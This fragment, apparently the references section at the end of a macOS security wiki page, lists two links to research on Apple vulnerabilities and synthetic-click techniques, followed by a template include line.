- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
